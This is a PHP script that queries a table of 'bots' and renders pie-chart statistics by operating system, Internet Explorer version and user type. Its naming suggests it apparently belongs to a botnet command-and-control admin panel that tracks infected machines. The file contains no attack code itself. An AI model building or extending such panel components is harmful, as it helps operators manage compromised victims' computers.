<?
	include_once "../common.php";
	include_once ROOT_PATH.'/mod/functs.php';
	if( !$user->Check() ) exit;

	$data   = array();
	$legend = array();

	switch ($_GET['by']) 
	{
		case 'os':
			$sql = " SELECT LEFT(bots_t.os_version_bot, 3) name, count(bots_t.id_bot) val FROM bots_t GROUP BY name";
			$title = 'Statistic by OS';
			break;
		case 'ie':
			$sql = " SELECT LEFT(bots_t.ie_version_bot, 1) name, count(bots_t.id_bot) val FROM bots_t GROUP BY name";
			$title = 'Statistic by IE version';
			break;
		case 'user_type':
			$sql = " SELECT bots_t.user_type_bot name, count(bots_t.id_bot) val FROM bots_t GROUP BY bots_t.user_type_bot";
			$title = 'Statistic by User Type';
			break;
	}

	$res = $db->query($sql);
	while ($mres = $res->fetch_array()) 
	{
		$data[] = $mres['val'];
		if ($_GET['by'] == 'os') $legend[] = get_os($mres['name']);
		else if ($_GET['by'] == 'ie') $legend[] = get_ie($mres['name']);
		else $legend[] = $mres['name'];
	}
	if (!count($data)) { $data[] = 0; $legend[] = 'None'; }

	require_once ROOT_PATH.'/plugins/ofc/php-ofc-library/open-flash-chart.php';
	
	$g = new graph();
	$g->pie(60,'#505050','{font-size: 12px; color: #404040;');
	$g->pie_values( $data, $legend );
	$g->pie_slice_colours( array('#d01f3c','#356aa0','#C79810') );
	$g->set_tool_tip('#x_label# - #val#');
	$g->title($title, '{font-size:18px; color: #d01f3c}');
	
	echo $g->render();

?>
